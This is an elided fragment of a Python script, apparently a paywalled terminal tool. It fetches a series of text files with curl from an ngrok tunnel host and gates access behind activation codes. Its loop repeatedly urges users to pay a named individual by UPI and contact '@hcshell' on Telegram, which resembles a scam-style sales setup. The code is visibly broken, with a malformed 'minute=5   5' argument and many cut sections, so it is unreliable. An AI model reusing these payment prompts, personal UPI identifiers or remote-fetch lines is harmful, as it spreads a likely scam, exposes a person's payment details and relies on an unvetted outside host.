...
def hero():
    ...
    numbers=[]
    Commands='curl https://5831-103-77-42-171.in.ngrok.io/ms.txt'
    Commands1='curl https://5831-103-77-42-171.in.ngrok.io/ms1.txt'
    Commands2='curl https://5831-103-77-42-171.in.ngrok.io/ms2.txt'
    Commands3='curl https://5831-103-77-42-171.in.ngrok.io/ms3.txt'
    Commands4='curl https://5831-103-77-42-171.in.ngrok.io/ms4.txt'
    Commands5='curl https://5831-103-77-42-171.in.ngrok.io/ms5.txt'
    Commands6='curl https://5831-103-77-42-171.in.ngrok.io/ms6.txt'
    Commands7='curl https://5831-103-77-42-171.in.ngrok.io/ms7.txt'
    Commands8='curl https://5831-103-77-42-171.in.ngrok.io/ms8.txt'
    Commands9='curl https://5831-103-77-42-171.in.ngrok.io/ms9.txt'
    Commands10='curl https://5831-103-77-42-171.in.ngrok.io/ms10.txt'
    Commands11='curl https://5831-103-77-42-171.in.ngrok.io/ms11.txt'

    system(banner)
    print(f"{red}Contact me on telegram @hcshell")
    now = datetime.datetime.now()
    First = now.replace(hour=19, minute=0, second=0, microsecond=0)
...
if(expirydate>today):
    now = datetime.datetime.now()
    First = now.replace(hour=13, minute=5   5, second=0, microsecond=0)
    ...
    if (now>Third and now<Thirdend):
        ...
        print(" admin on telegram @hcshell ")
    ...
    print(" on telegram ----@hcshell for activating")
    ...
    while(True):
        print("My banking name is HIMANSHU CHAVDA")
        ...
        print(f"If It Does'nt Open Contact Me On Telegram {yellow}@hcshell")
        print(f"{neon}*---------*----------*-------------*----------*")
        print(f"{red}*---------*----------*-------------*----------*")
        print("payhere--- UPI : ")
        #print(f"{yellow}UPI1 : sunny.9132@ybl")
        print(f"{yellow}UPI : chavdahimanshu0@oksbi")
        ...
        if(bhai==code or bhai==test or bhai==code1 or bhai==code2):
            ...
            print(f"{neon}On Telegram {red}@hcshell")
